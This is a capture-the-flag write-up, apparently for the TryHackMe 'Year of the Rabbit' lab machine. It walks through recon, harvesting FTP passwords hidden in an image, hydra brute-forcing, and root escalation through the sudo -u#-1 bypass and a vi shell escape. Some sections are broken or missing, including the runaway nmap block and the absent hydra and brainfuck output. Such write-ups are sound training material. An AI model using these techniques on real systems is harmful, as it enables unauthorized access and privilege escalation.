## Recon

1. Go to the website
2. Run a gobuster scan
3. Run a nmap scan

1. Website is the deafault apache website. Let's see if anything looks off. So the `css` is usually in the website, as seen from the [actual default page](). Here, its from `/assets/style.css`.

2. Gobuster also shows the same assets folder

3. Nmap scan looks pretty basic:
```
‚ùØ nmap -script=default -sV -A -T4 10.10.77.156
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 21:18 EST

Meanwhile, let's have a look at what's exploitable

So we do have some paths that we can take later down, but currently, we need a foothold.

While looking around, I first of all got rickrolled ;-; and secondly, found this ```
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```

Nice. Let's go there.

![](https://i.imgur.com/ahceSmx.png)


Very intersting. The page then redirects me to ... ANOTHER RICKROLL. üò†

Let's try turning off the javascript.

![](https://i.imgur.com/YZcZK4D.png)

Well well well. Anyways, I want to have a look at the traffic, and how this redirect is happening. Let's fire up burp.

Ah yes. We have

![](https://i.imgur.com/CTrYkbh.png)

Let's go there

So we have this guy as the url now: `http://10.10.77.156/WExYY2Cv-qU/`.

Going there we have:

![](https://i.imgur.com/SkYGtVx.png)

and a reverse image search tells us ... the image is of Lena Forsen, some Swedish model. I don't know how this is helpful.

I see no other place for exploration, so this is it then. We will search image for oddities.  


Ah yes! doing strings on the `Hot_Babe.png` shows the ftp username and a list of passwords:

```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
...
```

I'll run `hydra` on it, just because they have a nice starting message :)

```

## Foothold
Opening the creds we get something ... this looks like brainfuck, the langauge. yes! compiling it, we get:

There's nothing else, so let's login as `eli`.

After spending some disappointing amount of time on this, I realised this may be a `ssh` thing, not a `ftp` thing. <insert disappointment meme :( >


```

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




eli@year-of-the-rabbit:~$ ls
core  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
eli@year-of-the-rabbit:~$ 
```

Works! Now, I use the `locate` command to find all `*.txt` and I find these interesting things:

- `/home/gwendoline/user.txt`
- `/var/ftp/uploads/Eli's_Creds.txt`
- `/var/lib/exim4/berkeleydbvers.txt`

We know the second one. The third prints `5.3`. I don't know what that is. The first one is what we are after.

Unsurprisingly, we have 

`-r--r----- 1 gwendoline gwendoline   46 Jan 23  2020 user.txt`

Now, they do mention some common secret place in the message when we first loggied in.

```
eli@year-of-the-rabbit:~$ locate s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
```

GG.

```
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

lmao. okay, back to business. Logging as her, we get:
```
gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{pwned}
```

## Priv Esc

So we have 
```
gwendoline@year-of-the-rabbit:/$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

We can access `user.txt` using `vi` for some reason. The issue is, it says everyone except root can make it work. So ... can't really do anything.

At this point, `linpeas` looks like it could help. So, I'll scp that file to the machine. 

```
‚ùØ scp linpeas.sh gwendoline@10.10.186.25:~
gwendoline@10.10.186.25's password: 
linpeas.sh     100%  313KB 188.9KB/s   00:01
```

I'll let it run in the background. So I did not find anything much interesting, except `exim4` that it marked in red. Going up, we have:

```
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                         
Sudo version 1.8.10p3 
```

Very nice. So we have the [exploit](https://www.exploit-db.com/exploits/47502).

```
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

root@year-of-the-rabbit:/home/gwendoline# whoami
root
```

When you are in `vi`, go in the command more by pressing `:` and then run the command `!/bin/bash`

```
root@year-of-the-rabbit:/# locate *.txt
...
/root/root.txt
...
```

```
root@year-of-the-rabbit:/# cat /root/root.txt
THM{l33t}
```

PWNED!
